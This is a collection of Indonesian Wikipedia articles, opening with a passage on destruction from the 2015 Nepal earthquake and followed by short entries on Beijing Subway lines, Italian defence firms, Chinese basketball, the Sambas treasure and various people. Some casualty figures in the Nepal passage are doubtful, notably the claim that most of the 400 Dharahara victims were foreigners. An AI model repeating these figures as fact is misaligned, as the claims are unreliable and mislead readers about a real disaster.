Longsor di Lembah Langtang yang berlokasi di Taman nasional Langtang mengakibatkan sedikitnya 329 orang di laporkan hilang setelah salju longsor di desa Ghodatabela dan desa Langtang. Longsoran salju di perkirakan memiliki lebar dua hingga tiga kilometer. Desa Ghodatabela adalah tempat populer untuk rute mendaki dari Langtang..Desa Langtang Hancur akibat longsoran salju.300 orang di perkirakan tewas di permukiman kecil di pinggiran Desa Langtang yang terkubur selama gempa bumi seperti Chyamki,Thangsyap dan Mundu. 12 penduduk lokal dan 2 warga Asing selamat. Pada tanggal 6 Mei di umumkan bahwa 60 mayat telah ditemukan, sembilan di antaranya warga asing.

Puluhan ribu bangunan mengalami kerusakan di Beberapa distrik di Nepal, seluruh desa rata dengan tanah, terutama di dekat epicentrum gempa. Bandar Udara Internasional Tribhuvan,Nepal di tutup pasca gempa bumi, Bandara hanya di buka untuk pesawat yang membawa bantuan kemanusiaan, beberapa hari kemudian, Bandara di buka untuk beberapa pesawat komersial. pada tanggal 3 mei Bandara kembali di tutup untuk pesawat besar karena landasan pacu mengalami kerusakan akibat gempa bumi susulan.

Banyak gereja di Kathmandu runtuh. Pada hari sabtu adalah hari utama beribadah untuk umat kristen di Nepal, 500 orang di laporkan tewas akibat tertimpa reruntuhan gereja.

Beberapa Pagoda di Durbar square Kathmandu, Situs Warisan Dunia UNESCO runtuh.

Menara Dharahara di pusat kota Kathmandu runtuh. 400 orang dilaporkan tewas, mayoritas korban tewas adalah Warga Asing yang sedang berwisata di menara Dharahara.

Kuil Manakamana di Gorkha,Nepal juga runtuh. Sisi utara Janaki Mandir di Janakpur,Nepal mengalami kerusakan. banyak kuil termasuk Kasthamandap, kuil Panchtale,Basantapur Durbar, kuil Dasa avtar runtuh.

Sekitar 90 persen tentara dari Angkatan darat Nepal di kirim ke daerah - daerah yang di landa pasca gempa di bawah operasi Sankat Mochan, dengan relawan di kerahkan dari negara lain. Hujan dan Gempa bumi susulan menjadi faktor penghambat penyelamatan. Potensi tanah longsor dan bangunan runtuh menjadi keprihatinan para penyelamat. Jalanan yang dilalui dan infrastruktur komunikasi mengalami kerusakan menimbulkan tantangan besar dalam penyelamatan.

Pada 1 Mei 2015, lembaga bantuan Int ernasional seperti Dokter Lintas Batas dan Palang Merah mulai mengevakuasi korban yang terluka dan,kritis menggunakan Helikopter dari daerah terpencil.
Ada khawatiran berbagai macam penyakit karena kurangnya Air bersih dan kurangnya toilet.

Para tim sar mendeteksi korban yang masih hidup dan terperangkap dalam reruntuhan menggunakan Alat pendeteksi detak jantung canggih. dan menyelamatkannya. Para korban terperangkap reruntuhan bangunan sedalam 10 kaki di desa Chautara,utara Kathmandu. Para tim penyelamat dari berbagai negara menggunakan perangkat FINDER untuk mendeteksi korban di reruntuhan bangunan.

Sebuah Helikopter Marinir Amerika serikat Jatuh pada 12 Mei 2015, helikopter tersebut mengangkut pasokan bantuan untuk korban gempa nepal di daerah terpencil. Kecelakaan terjadi di Charikot,sekitar 45 miles (72 km) timur Kathmandu. Dua tentara Nepal dan 6 tentara Amerika tewas dalam kecelakaan.




</doc>
<doc id="1751067" url="https://id.wikipedia.org/wiki?curid=1751067" title="Jalur 13, Beijing Subway">
Jalur 13, Beijing Subway

Jalur 13 Beijing Subway (), atau dikenal dengan "CityRail" (城市铁路) adalah jalur angkutan cepat yang melayani bagian pinggiran utara kota Beijing. Rute jalur Jalur 13 melewati utara kota dan menghubungkan kawasan perumahan di Haidian, Changping dan Chaoyang dan Jalur 2 di Xizhimen dan Dongzhimen. Dengan pengecualian Dongzhimen, semua jalur dan stasiun Jalur 13 terletak melayang atau di atas tanah. Dengan panjang jalur 40.9 km, Jalur 13 adalah jalur terpanjang Beijing Subway sampai perpanjangan Jalur 10 dibuka. Warna Jalur 13 adalah amber. Di waktu sibuk, seksi antara Stasiun Xizhimen dan Wudaokou adalah seksi paling sibuk kedua di jaringan Beijing Subway, dengan trafik mencapai 130% kapasitas.


</doc>
<doc id="1751198" url="https://id.wikipedia.org/wiki?curid=1751198" title="Jalur 15, Beijing Subway">
Jalur 15, Beijing Subway

Jalur 15 Beijing Subway () adalah jalur angkutan cepat di bagian utara Beijing yang sampai saat ini masih dalam pembangunan. Total, jalur ini akan memiliki panjang total 45.7 km melewati Xiyuan di Distrik Haidian di barat sampai Hedong di Distrik Shunyi di timur. Jalur ini menggunakan sistem Sparcs CBTC dari Nippon Signal. Jalur ini dibangun dalam 2 fase. Jalur ini menggunakan rangkaian kereta 6 gerbong mirip dengan jalur lain di Beijing Subway. Terowongan Jalur 15 terletak 38 meter dibawah tanah, paling dalam di jaringan Beijing Subway. 



</doc>
<doc id="1751203" url="https://id.wikipedia.org/wiki?curid=1751203" title="Indonesia Digital Association">
Indonesia Digital Association

Indonesia Digital Association (bahasa Indonesia: Asosiasi Digital Indonesia, disingkat IDA) adalah sebuah perkumpulan yang berperan menaungi para pemain usaha di bidang periklanan digital dan mengawasi gerak periklanan digital di Indonesia. Hingga pada tahun 2015, para anggota yang terkumpul ke dalam IDA di antaranya adalah Detik.com, inilah.com group, Kapanlagi.com, Kompas.com, Liputan6.com, Merdeka.com, Metrotvnews.com, okezone.com, Tempo.co, Tribunnews.com, dan viva.co.id.

Motif dari pembentukan IDA adalah meningkatkan dan mengembangkan industri digital di Indonesia. Lalu, tujuan yang diraih oleh IDA adalah mengedukasi pengiklan dan agensi mengenai nilai periklanan digital, membuat dan menyepakati kode etik dalam beriklan digital, menciptakan forum diskusi dan mempererat relasi industri, dan menerapkan standarisasi panduan riset dan materi kreatif.

Pada tahun 2014, IDA bersama dengan E-Commerce Association (idEA) aktif menggalang protes kepada dua operator telepon seluler XL Axiata dan Telkomsel berkaitan dengan metode periklanan digital yang dilakukan kedua operator tersebut. Baik XL maupun Telkomsel disebut menggunakan dua metode iklan serobot ("intrusive Ads") yaitu "interstitial" dan "Off-decks". "Interstitial ads" adalah halaman iklan yang muncul pada saat pemuatan halaman situs dan "off-decks" adalah iklan yang muncul di laman sebuah situs.

Kedua asosiasi tersebut memperkarakan tiga hal kepada XL dan Telkomsel. Pertama, iklan yang ditampilkan tidak melalui persetujuan terlebih dahulu dengan pemilik situs. Kedua, XL dan Telkomsel mempraktikan usaha persaingan yang tidak sehat dalam industri periklanan. Dalam hal ini mereka berusaha mengambil untung lebih banyak secara sepihak dan mempengaruhi pendapatan para pengiklan digital lainnya. Ketiga, kedua operator tersebut melanggar Pasal 32 Ayat 1 Undang-Undang Nomor 11 Tahun 2008 tentang Informasi dan Transaksi Elektronik, yang memuat hukum internet di Indonesia melarang siapapun untuk mengubah, menambah, mengurangi, transmisi, merusak, menghilangkan, memindahkan, menyembunyikan atau informasi elektronik atau dokumen milik orang lain atau milik umum. Serta Pasal 20 UU No. 8 Tahun 1999 tentang perlindungan konsumen yang berbunyi “Pelaku usaha periklanan bertanggung jawab atas iklan yang diproduksi dan segala akibat yang ditimbulkan oleh iklan tersebut.” Bagi kedua asosiasi, apa yang dilakukan oleh dua operator tersebut sama seperti hijacking atau hostile redirecting yang menguntungkan satu pihak.

Para pemilik situs yang tergabung dalam IDA (21 anggota) dan idEA (39 anggota) merasa dirugikan oleh iklan serobot para operator telekomunikasi yang menyusup ke situs mereka demi keuntungan sepihak. Akses ke laman situs pun terasa lebih lamban sejak iklan serobot menyusup. Asosiasi Penyelenggara Jasa Internet Indonesia (APJII) pun menyayangkan tindakan kedua operator tersebut karena iklan serobot tidak hanya merugikan pemilik situs, tapi juga konsumen.

Meski diprotes, pihak operator didukung dengan Asosiasi Penyelenggara Telekomunikasi Seluruh Indonesia (ATSI) justru berpendapat bahwa pemasangan iklan serobot sama sekali tak menyalahi norma karena infrakstruktur jaringan sepenuhnya milik operator dan mereka berhak menaruh iklan di media manapun.

Sebelumnya pada tahun 2013, IDA telah menggelar diskusi formal mengenai permasalahan iklan melaui Kelompok Kerja Media Online (KKMO) dengan hasil tertulis bahwa kedua operator akan menghentikan iklan serobot. Namun, tetap saja iklan serobot dilakukan. Menyesali hal tersebut, idEA dan IDA pun membuat petisi di situs change.org mengenai penghentian iklan serobot. Pergelaran petisi ini menggunakan landasan hukum Pasal 32 Ayat 1 UU No. 11/2008 tentan Informasi dan Transaksi Elektronik (ITE). Target tanda tangan yang hendak digalang berjumlah 2500 tanda tangan.

Menanggapi kontroversi ini, pihak regulator Badan Regulasi Telekomunikasi Indonesia (BRTI) melakukan mediasi dengan mempertemukan dua pihak yang berseteru dengan tujuan mendapatkan win-win solution. Meski telah dilakukan langkah demikian, hingga saat ini BRTI masih belum melakukan mediasi.


</doc>
<doc id="1751205" url="https://id.wikipedia.org/wiki?curid=1751205" title="Jalur 14, Beijing Subway">
Jalur 14, Beijing Subway

Jalur 14 Beijing Subway () adalah jalur angkutan cepat yang melayani kawasan selatan dan timur Beijing. Per 28 Desember 2014, jalur ini terdiri dari 2 segmen tak bersambung. Pertama sepanjang 12.4 km dengan 7 stasiun, kedua sepanjang 14.8 km dengan 10 stasiun dan dioperasikan oleh Beijing MTR Corp. Ltd.

Jalur ini sedang diperpanjang dari Zhangguozhuang di sebelah barat Sungai Yongding ke Shan'gezhuang. Ketika selesai, Jalur 14 akan memiliki jalur sepanjang 47.7 km dengan 36 stasiun.


</doc>
<doc id="1751213" url="https://id.wikipedia.org/wiki?curid=1751213" title="Avio">
Avio

Avio S.p.A. adalah sebuah perusahaan Italia yang beroperasi di sektor kedirgantaraan dengan kantor pusat di Rivalta di Torino, Turin, Italia. Didirikan pada tahun 1908, hadir di Italia dan luar negeri dengan kantor komersial yang berbeda dan 10 lokasi produksi. Avio beroperasi di 5 area bisnis utama di sektor sipil dan militer:


Avio adalah Kontraktor Utama untuk peluncur Eropa baru Vega.

Perusahaan ini aktif di bidang penelitian teknologi. Perusahaan ini membawa keluar proyek bekerjasama dengan 14 universitas antara Italia dan pusat-pusat penelitian dan 10 negara asing, yang ditujukan untuk perbaikan terus-menerus dari produk dan proses teknologi. Hal ini juga melakukan penelitian solusi untuk mengurangi dampak lingkungan dari mesin pesawat, sesuai dengan tujuan konsumsi dan pengurangan emisi, di wilayah Eropa.








</doc>
<doc id="1751216" url="https://id.wikipedia.org/wiki?curid=1751216" title="Jalur Batong, Beijing Subway">
Jalur Batong, Beijing Subway

Jalur Batong Beijing Subway () adalah jalur angkutan cepat atas tanah yang terletak di sebelah timur Beijing. Jalur ini merupakan perpanjangan Jalur 1 di bagian timur dari Sihui ke pinggiran kota di Distrik Tongzhou. Jalur Batong kadang disingkat dengan 8T tetapi berbeda dengan Jalur 8 Beijing Subway.

Seluruh Jalur Batong berada di atas tanah dengan panjang rute 18.9 km dari Stasiun Sihui di barat sampai Tuqiao di timur. Warna Jalur Batong sama dengan Jalur 1 yaitu merah.


</doc>
<doc id="1751226" url="https://id.wikipedia.org/wiki?curid=1751226" title="Oto Melara">
Oto Melara

Oto Melara adalah sebuah perusahaan pertahanan Italia dengan pabrik-pabrik di Brescia dan La Spezia. Oto Melara senjata paling terkenal sejak Perang Dunia II adalah paket howitzer Model 56, yang dalam pelayanan di seluruh dunia, dan naval gun 76mm, yang telah diadopsi oleh 53 angkatan laut dan diinstal pada lebih dari 1.000 kapal angkatan laut.

Vehicles manufactured include:

Manufajtur senjata termasuk

Manufaktur amunisi termasuk



</doc>
<doc id="1751227" url="https://id.wikipedia.org/wiki?curid=1751227" title="Tifsah">
Tifsah

Tifsah ( "Tipsakh"; ; ) adalah sebuah kota kuno di tepian barat sungai Efrat yang sekarang terletak di modern Suriah atau Turki. Kota ini dulunya penting dan makmur karena menjadi tempat penyeberangan (arti nama Ibrani: "tipsakh" = "penyeberangan") dan lalu lintas perdagangan barat-timur. Lokasi tepatnya sekarang tidak diketahui pasti.

Nama "Tifsah" berasal dari bahasa Ibrani: תִּפְסַח; yang berarti "tempat menyeberang" Nama Yunani dan Romawi untuk tempat ini adalah "Thapsacus".

Lokasi tepatnya sekarang tidak dapat dipastikan. Ada sejumlah tempat yang diduga adalah bekas lokasi Thapsacus. Salah satunya yang diusulkan oleh Farrell dan Engels adalah dekat dengan kota kuno Karkhemis, yang sekarang terletak di wilayah Turki, pada perbatasan dengan Suriah. Karkamış (Turki) dan Jarabulus (Suriah) adalah kota-kota modern terdekat dengan lokasi ini. Ada sejumlah sumber kuno yang mendukung. Yang tertua adalah daftar perjalanan tahun 401 SM oleh sebagaimana dicatat oleh Xenophon, dalam tulisannya . Farrell menghitung bahwa laju perjalanan mendukung penyeberangan di Karkhemis, kemudian menyeberangi dan kemudian menyusuri sungai itu sampai ke pertemuan dengan sungai Efrat. Ahli geografi Eratosthenes, yang hidup pada abad ke-3 dan ke-2 SM, menyatakan jarak 4800 stade dari Thapsacus ke Babilonia melalui jalur sepanjang sungai Efrat. Jarak ini sekarang sekitar , yang dekat dengan jarak sebenarnya dari Karkhemis ke Babilonia sejauh . Eratosthenes juga menyatakan jarak 2400 stade untuk jalur terdekat ke sungai Tigris dari Thapsacus. Jarak sejauh ini juga dekat dengan jarak yang diukur dengan teknik modern. Arrian menulis bahwa Aleksander Agung menyusuri jalur dengan sungai Efrat dan pegunungan Armenia di sebelah kiri setelah ia menyeberangi sungai Efrat di Thapsacus pada tahun 331 SM. Engels menafsirkan informasi ini sebagai dukungan tambahan untuk lokasi dengan Karkhemis.
Gawlikowsi mendukung identifikasi Thapsacus dengan , yang lebih ke arah hulu sungai Efrat.

Kota ini juga dikaitkan dengan . Lebih lanjut juga dikaitkan dengan kota Balis di distrik Halab, Suriah.


Ada dua rujukan Tifsah dalam Alkitab, yang sama-sama diperdebatkan identifikasinya dengan Thapsacus:
Easton's Bible Dictionary menyatakan sama dengan Thapsacus, sedangkan menulis bahwa "tidak mungkin ditentukan apakah satu frasa "dari Tifsah sampai ke Gaza", setua periode Persia; teks Yunani tidak jelas."




</doc>
<doc id="1751235" url="https://id.wikipedia.org/wiki?curid=1751235" title="Asosiasi Basket Tiongkok">
Asosiasi Basket Tiongkok

Asosiasi Basket Tiongkok (Bahasa Inggris: Chinese Basketball Association, ), yang sering disingkat menjadi CBA, adalah sebuah liga basket profesional pria pre-eminen di Asia.

Liga tersebut umumnya dikenal sebagai CBA, dan inisialisme ini sering digunakan dalam bahasa Tionghoa. Terdapat juga Asosiasi Basket Wanita Tiongkok (ABWT) untuk wanita.

CBA tidak ada hubuangannya dengan Liga Basket Nasional (LBN), yang merupakan liga minor "Divisi 2" profesional.

Beberapa pemain CBA Tiongkok, seperti Wang Zhizhi, Yao Ming, Mengke Bateer, Yi Jianlian, dan Sun Yue, juga bermain dalam NBA. Sejumlah pemain asing secara terbatas dimasukkan pada masing-masing tim CBA. Pemain yang terkenal meliputi NBA All-Stars Stephon Marbury, Steve Francis, Gilbert Arenas, Tracy McGrady, Al Harrington dan Metta World Peace, serta pemain NBA yang menjadi CBA All-Stars Kenyon Martin, J. R. Smith, Aaron Brooks, dan Shavlik Randolph.

Liga tersebut mulai bermain pada 1994. Namun, CBA yang dijadikan nama dari liga tersebut tidak ada hubuangannya dengan organisasi "Asosiasi Basket Tiongkok", yang didirikan pada Juni 1956 . Pada 1996 James Hodges menjadi salah satu orang Amerika pertama yang bermain dalam CBA. Sekarang, badan yang teregulasi untuk basket di China adalah Pusat Manajemen Basket Tiongkok ().

Liga basket Tiongkok lainnya meliputi Liga Basket Nasional (LBN), Asosiasi Universitas Basket Tiongkok (AUBT) dan Liga Basket Sekolah Tinggi Tiongkok (LBSTT) . Pada susatu kali, terdapat sebuah liga yang bernama Chinese New Basketball Alliance (CNBA) , salah satu timnya adalah Beijing Sea Lions, namun liga tersebut hanya berlangsung satu musim (1996–97) .

 

Pada 2005, liga tersebut membuat "Piala Mou Zuoyun" (), yang dianugerahi untuk pertama kalinya kepada tim pemenang pada babak akhir. Mou Zuoyun (kelahiran 1913) adalah seorang anggota dari tim basket nasional pria China di Olimpiade Musim Panas 1936, dan kemudian menjabat sebagai pelatih dan pelopor pada gedung basket Tiongkok. 



Pemain impor yang setidaknya ikut lebih dari satu musim dalam CBA:





</doc>
<doc id="1751237" url="https://id.wikipedia.org/wiki?curid=1751237" title="Temuan Sambas">
Temuan Sambas

Temuan Sambas atau Harta Karun Sambas adalah benda temuan arkeologi berharga berupa artefak arca-arca Buddha berbahan emas, perak, dan perunggu yang ditemukan di Kota Sambas di Kalimantan Barat yang kini menjadi koleksi British Museum di London, Inggris. Berasal dari abad ke-8 sampai abad ke-9, temuan ini diperkirakan dibuat di Jawa, dan lebih awal sekitar empat abad sebelum masuknya Islam ke Indonesia pada abad ke-13.

Sebelum ajaran Islam mulai masuk ke Indonesia pada abad ke-13 Masehi, agama Buddha dan Hindu dari India, adalah agama mayoritas sebagian besar penduduk Nusantara. Setelah sekian lama, banyak arca-arca Buddha dibawa ke Nusantara oleh para peziarah yang pulang dari tanah suci Buddhisme di India Timur. Arca-arca ini kemudian menginspirasi pengrajin dan seniman lokal untuk menciptakan karya seni rupa Buddha gaya mereka sendiri. Arca-arca Buddha temuan Sambas dapat dipastikan dibuat di Jawa, karena menunjukkan gaya arca Jawa Tengahan periode kerajaan Medang Mataram pada dinasti Sailendra, yang dipengaruhi kesenian Buddha Benggala di India Timur beberapa abad sebelumnya.

Harta karun Sambas ditemukan di dalam guci tembikar di pantai barat daya Kalimantan pada dekade 1940-an. Temuan ini kemudian dijual oleh penemunya, dan jatuh ke tangan Tan Yeok Seong, seorang kolektor dan sejarahwan Asia Tenggara warga Singapura. Harta karun ini kemudian dibeli oleh seorang filantropi PT Brooke Sewell, yang kemudian menyumbangkannya kepada British Museum pada 1956.

Temuan ini terdiri atas sembilan arca emas dan perak yang menggambarkan sosok Buddha dan Bodhisatwa. Arca terbesar berukuran sekitar tinggi 18 cm menggambarkan Buddha tengah berdiri terbuat dari perak murni. Selain arca-arca Buddha, harta karun ini juga mencakup pedupaan perunggu berbentuk rumah, dan plakat nazar perak bertuliskan "dhāraṇī", yang ditemukan di dasar arcfa Buddha. Kehalusan, keterampilan dan kualitas pengrajin patung, serta penggunaan logam mulia menunjukkan bahwa benda-benda ini aslinya dimiliki oleh seorang pembesar atau pejabat setempat, atau bangsawan penganut agama Buddha.



</doc>
<doc id="1751239" url="https://id.wikipedia.org/wiki?curid=1751239" title="Buckhead, Georgia">
Buckhead, Georgia

Buckhead adalah sebuah kota di Kabupaten Morgan, Georgia, Amerika Serikat. Pada sensus 2010, kota tersebut memiliki penduduk berjumlah 171 orang.

Buckhead terletak di (33.568012, -83.362443).

Menurut Biro Sensus Amerika Serikat, kota tersebut memiliki wilayah seluas 0.8 mil persegi (2.1 km²), semuanya adalah tanah.

Menurut sensus 2000, terdapat 205 orang, 68 rumah tangga, dan 55 keluarga yang tinggal di kota tersebut. Kepadatan penduduknya adalah 257.5 orang per mil persegi (98.9/km²). Terdapat 81 uni perumahan pada kepadatan rata-rata 101.8/sq mi (39.1/km²). Kelompok etnis di kota tersebut meliputi 65.37% Orang Kulit Putih, 29.27% Afrika Amerika, 5.37% dari ras lainnya. Hispanik atau Latino meliputi 2.93% dari seluruh penduduk.


</doc>
<doc id="1751242" url="https://id.wikipedia.org/wiki?curid=1751242" title="Hanny Herlina">
Hanny Herlina

Hanny Herlina () adalah seniman berkebangsaan Indonesia. Namanya dikenal melalui sejumlah karyanya berupa koreografi tari yang dipentaskan di berbagai panggung pertunjukan, di dalam negeri maupun mancanegara. Hanny Herlina merupakan salah satu penerima hibah seni dari Yayasan Kelola.

Hanny Herlina lahir di Jakarta, 1 Desember 1976. Mulai belajar tari Sunda sejak umur 6 tahun di Studio Tari Ekayana. Untuk memperdalam pengetahuannya tentang tari Hanny mengikuti pertukaran pelajar di Mount Erin High School, Australia. Setelah lulus tahun 1997, ia melanjutkan pendidikan di Institut Kesenian Jakarta (IKJ) pada jurusan Seni Tari. Berbagai "workshop" telah ia ikuti, di antaranya "workshop tari" dengan Min Tanaka (Body Weateher), "workshop" tari dengan Astad Daboo (Khatak dan Khatali) yang diadakan oleh yayasan Kelola di Surakarta (2003), "workshop" tari Zapin Melayu oleh Tom Ibnur di IKJ, dan "workshop" Combines Indian Khatak Movement with Fast and Farious Contempory Dance oleh Akram Khan yang diselenggarakan oleh Kedutaan Besar Inggris dan IKJ. Dia juga mengikuti "workshop" dari Schaubuehne Berlin, yang diberikan oleh Juan Kruz Diaz se Garario Esnaok, yang diselenggarakan oleh Goethe-Institut dan IKJ (2001). Pengetahuan beberapa jenis tari topeng dan tari Jawa ditimba dari dari mimi Rasinah (alm) dan Wangi Indriya (Indramayu), I Made Sidja (Bona, Bali), Kartini (Losari) dan Retno Maruti (Jakarta).

Pada Showcase Indonesian Dance Festival 1999, bersama Aldri dan Ita Wijayanti, Hanny Herlina mementaskan karya "Mba-bu" di IKJ. Tahun 2000, ia pentas keliling Yogya, Jambi, Padang, dan Medan membawakan karya Deddy Luthan dengan karya "Abad". Pada tahun yang sama, ia menciptakan karya "Impian" dan "Curent" yang dipergunakan untuk ujian komposisi. Tahun 2001, ia menciptakan karya "Niti" yang dipentaskan pada acara Pekan Karya Tari dan Musik di Gedung Kesenian Jakarta dan Graha Bhakti Budaya Taman Ismail Marzuki pada acara Ulang Tahun TIM. Tahun 2002, karyanya, "Bangun" dipentaskan di Teater Utan Kayu, karya "Kepak Sayap Putih" dipentaskan pada Temu Koreografi Wanita di Teater Besar STSI Surakarta. Sebagai koreografer, Hanny Herlina pernah berkolaborasi dengan sejumlah seniman kenamaan antara lain Min Tanaka (Jepang), Chen Shi Zhen (USA), Retno Maruti, Sardono W. Kusumo, Deddy Luthan, Arcadius Sentot Sudiharto, Mugiyono Kasido, dan Yudi A. Tadjudin (sutradara Teater Garasi).



</doc>
<doc id="1751244" url="https://id.wikipedia.org/wiki?curid=1751244" title="Perjanjian plurilateral">
Perjanjian plurilateral

Perjanjian plurilateral adalah perjanjian hukum atau dagang multinasional antarnegara. Dalam ekonomi, perjanjian ini dilakukan antara lebih dari dua negara, tetapi tidak terlalu banyak seperti perjanjan multilateral.

Istilah "perjanjian plurilateral" digunakan di Organisasi Perdagangan Dunia. Perjanjian ini berarti bahwa negara anggota WTO diberi pilihan untuk menyetujui peraturan baru secara sukarela. Ini berbeda dengan perjanjian multilateral WTO yang melibatkan seluruh negara anggota. Agreement on Government Procurement adalah contoh perjanjian plurilateral.

Traktat plurilateral adalah sejenis traktat multilateral yang lebih istimewa. Traktat ini disepakati oleh sedikit negara yang sama-sama memiliki kepentingan khusus. Perbedaan utama antara traktat plurilateral dan multilateral adalah reservasinya (keluhan atau keengganan) justru lebih sedikit di traktat plurilateral. Karena sidatnya yang terbatas, seluruh pihak yang menandatangani traktat diminta untuk bekerja sama agar tujuan traktat bisa dicapai. Akibatnya, reservasi tidak dibolehkan tanpa seizin semua pihak penandatangan. Prinsip ini diatur dalam Pasal 20(2) Konvensi Hukum Perjanjian Wina:
Apabila diketahui dari jumlah negaranya yang terbatas dan tujuan perjanjiannya bahwa pelaksanaan keseluruhan perjanjian antara semua pihak sangat penting bagi setiap pihak yang terikat perjanjian ini, sebuah reservasi perlu disetujui oleh semua pihak.


</doc>
<doc id="1751254" url="https://id.wikipedia.org/wiki?curid=1751254" title="Pemerintahan global">
Pemerintahan global

Pemerintahan global () adalah gerakan penyatuan pelaku-pelaku politik lintas negara yang bertujuan mencari solusi bagi permasalahan yang dialami beberapa negara atau kawasan. Gerakan ini biasanya melibatkan pelembagaan (institusionalisasi). Lembaga-lembaga pemeirntahan global seperti PBB, Mahkamah Internasional, dan Bank Dunia memiliki kuasa yang dibatasi untuk menjamin kepatuhan anggota. Persoalan pemerintahan global masa kini ada dalam konteks globalisasi dan rezim berkuasa yang mengglobal secara politik, ekonomi, dan budaya. Menanggapi cepatnya saling ketergantungan yang terjadi di dunia, baik antara masyarakat dan umat manusia dengan alam sekitar, istilah "pemerintahan global" bisa pula digunakan untuk menyebut proses perumusan hukum, peraturan, atau regulasi global.

Pemerintahan global bukan sistem tunggal. Tidak ada "pemerintahan dunia" ("world government"), tetapi berbagai rezim pemerintahan global memiliki kesamaan:




</doc>
<doc id="1751271" url="https://id.wikipedia.org/wiki?curid=1751271" title="Jens Böhrnsen">
Jens Böhrnsen

Jens Böhrnsen (kelahiran 12 Juni 1949) adalah seorang politikus Jerman dari PDS. Sejak 2005, ia telah menjabat sebagai Presiden Senat dan Wali kota Kota Bremen, yang merupakan, kepala pemerintahan kota-negara bagian Kota Bremen. Ia menjadi Presiden Dewan Federal pada 2009, dan selain itu, ia menjadi pelaksana jabatan kepala negara (31 Mei - 30 June 2010) setelah pengunduran diri Presiden Jerman Horst Köhler.

Ia adalah seorang pengacara melalui profesi dan menjabat sebagai seorang hakim di Bremen dari 1978 sampai 1995, ketika ia menjadi politikus waktu penuh.

Böhrnsen lahir pada 12 Juni 1949 di Gröpelingen, yang kemudian menjadi sebuah distrik para pekerja dari Bremen, dari orang tua yang aktif dalam Partai Demokratik Sosial Jerman (PDS) dan serikat buruh. Ayahnya, Gustav Böhrnsen, seorang komunis yang beralih ke sosial demokrat, juga merupakan seorang politikus PDS dan menjabat sebagai ketua grup PDS di Parlemen Bremen 1968-1971. Jens Böhrnsen bergabung dengan PDS pada 1967. Di Universitas Kiel, ia mempelajari hukum, dan menjalani pembelajarannya dengan "Staatsexamen" pertama pada 1973, dan "Staatsexamen" kedua pada 1977 di Universitas Hamburg. Ia bekerja sebagai assessor di administrasi Bremen, setelah itu menjadi hakim selama 17 tahun, sebelum ia terpilih pada Parlemen Bremen ("Bürgerschaft").



</doc>
<doc id="1751278" url="https://id.wikipedia.org/wiki?curid=1751278" title="K. V. Kamath">
K. V. Kamath

Kundapur Vaman Kamath, yang umumnya disebut sebagai K.V. Kamath, adalah ketua Bank Pengembangan Baru dari negara-negara BRICS, ia menjabat sebagai ketua Infosys Limited, perusahaan pelayanan TI India terbesar kedua, dan Ketua Non-Eksekutif Bank ICICI, bank swasta terbesar di India. Kamath juga menjabat sebagai direktur managing dan CEO Bank ICICI dari 1 Mei 1996 sampai ia pensiun dari tanggung jawab eksekutif pada 30 April 2009.

Kamath menjabat sebagai Ketua Infosys dari N R Narayana Murthy pada 21 Agustus 2011. Sebelum menjabat dalam posisi tersebut, ia menjadi Ketua Non-Eksekutif dari perusahaan tersebut dari 2 Mei 2011.

Kamath juga menjabat sebagai direktur independen pada badan-badan perusahaan pelayanan minyak yang berbasis di Houston Schlumberger dan pabrik obat-obatan India Lupin. Ia juga merupakan anggota dari Badan Gubernur Universitas Petroleum Pandit Deendayal.

Kamath lahir pada 2 Desember 1947 di sebuah keluarga Gaud Saraswat Brahmin (GSB) di Mangalore, Karnataka. Keluarganya berpindah dari Kundapur di Karnataka, dan nama ayahnya adalah Vaman Kamath. Bahasa ibunya adalah Konkani dan ia juga dapat berbicara dalam bahasa Kannada, Hindi and Inggris. Ia kebanyakan menjalani tahun-tahun awalnya di Mangalore, dan masuk sebuah sekolah pemerintahan medium Kannada. Setelah matrikulasi, ia menyelesaikan PUC-nya (Pra-Universitas), yang pada waktu itu hanya berjalan selama setahun, di Kolese St. Aloisius. Setelah menyelesaikan PUCnya, ia bergabung dengan Institut Teknologi Nasional Karnataka, Surathkal (dikenal pada waktu itu dengan nama Kolese Teknik Wilayah Karnataka) untuk Gelar Sarjana dalam bindang Teknik Mekanik. Setelah lulus dari NIT Surathkal pada 1969, ia bergabung dengan Institut Manajemen India, Ahmedabad (IIM-A) untuk Gelar Lulusan Diploma dalam bidang Manajemen.



</doc>
<doc id="1751287" url="https://id.wikipedia.org/wiki?curid=1751287" title="Otobreda 127/54 Compact">
Otobreda 127/54 Compact

Otobreda 127mm/54 Compact (127/54C) adalah senjata artileri angkatan laut kegunaan ganda dibangun oleh perusahaan Italia Oto Melara. Ia menggunakan putaran 127mm yang juga digunakan dalam senjata 5 inci/54, meskipun yang kaliber senjata ini diukur dalam pengukuran imperial daripada metrik. Senjata menggunakan sistem loading mana 66 127mm putaran dari berbagai jenis dapat disimpan siap-api dalam tiga drum loader (masing-masing memegang 22 putaran). Barel berpendingin air. Senjata ini masih digunakan oleh angkatan laut di seluruh dunia tetapi perlahan-lahan digantikan oleh Otobreda 127/64 untuk kapal baru, seperti kelas frigat F125 Angkatan Laut Jerman dan FREMM Angkatan Laut Italia.



</doc>
<doc id="1751289" url="https://id.wikipedia.org/wiki?curid=1751289" title="76mm/L62 Allargato">
76mm/L62 Allargato

76mm/L62 Allargato adalah meriam angkatan laut otomatis barel tunggal, kaliber menengah, kegunaan ganda yang dirancang dan diproduksi pada tahun 1960 oleh perusahaan pertahanan Italia dari OTO Melara sebagai persenjataan meriam untuk semua kapal perang menengah dan kelas besar dibangun untuk Angkatan Laut Italia. Saat ini, Senjata tetap dalam pelayanan dengan kapal patroli Italia kelas Cassiopea tetapi telah dinyatakan telah digantikan oleh serangkaian meriam Otobreda 76 mm.




</doc>
<doc id="1751290" url="https://id.wikipedia.org/wiki?curid=1751290" title="Jan Rudolph van Musschenbroek">
Jan Rudolph van Musschenbroek

Jan Rudolph van Musschenbroek () adalah pelukis dan ilustrator Belanda.

Jan Rudolph Van Musschenbroek adalah putera Samuel Corneille Jean Wilhelm van Musschenbroek, seorang pejabat pemerintahan, dan jkvr. Wilhelmina Henrietta Teding van Berkhout. Ia menempuh pendidikan teknik sipil di politeknik di Delft, namun kemudian membelok ke bidang seni dan melukis di Delft, Den Haag, Wassenaar, dan Rheden. Jan Rudolph Van Musschenbroek terutama menggambar pemandangan kota.

Pada tahun 1910, ia diangkat sebagai komisaris West-Borneo Cultuur Maatschappij. Sebagai teknisi sipil, ia menerima paten atas mesin pengering pada tahun 1918.

Van Musschenbroek menikah pada tanggal 11 September 1908 dengan pelukis Eliza Petronella de Kuyper.. Setelah meninggal, Van Musschenbroek dimakamkan di pemakaman Heiderust.



</doc>
